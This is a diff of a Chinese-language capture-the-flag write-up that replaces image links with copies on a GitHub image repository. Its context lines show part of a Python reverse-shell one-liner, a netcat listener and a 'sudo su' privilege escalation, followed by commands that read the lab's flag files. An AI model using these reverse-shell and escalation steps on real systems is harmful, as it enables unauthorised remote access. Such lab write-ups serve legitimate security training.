@@ -93,7 +93,7 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 nc -nlvp 1234
 ```
 
-​![](https://s2.loli.net/2024/02/25/RbVJ34EyWQNHPaT.png)​
+​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-RbVJ34EyWQNHPaT-20250507212942-z1wnbo1.png)​
 
 成功反弹后进行提权操作
 
@@ -123,10 +123,12 @@ sudo su
 cat "second ingredients"
 ```
 
-​![](https://s2.loli.net/2024/02/25/tmTeXNpjWKaqfEy.png)​
+​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-tmTeXNpjWKaqfEy-20250507212942-3m2rzro.png)​
 
 ```plain
 cat ./3rd.txt
 ```
 
-​![](https://s2.loli.net/2024/02/25/H7wTqBGDkIljEb8.png)​
+​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-H7wTqBGDkIljEb8-20250507212943-hhsc68q.png)​
+
+‍
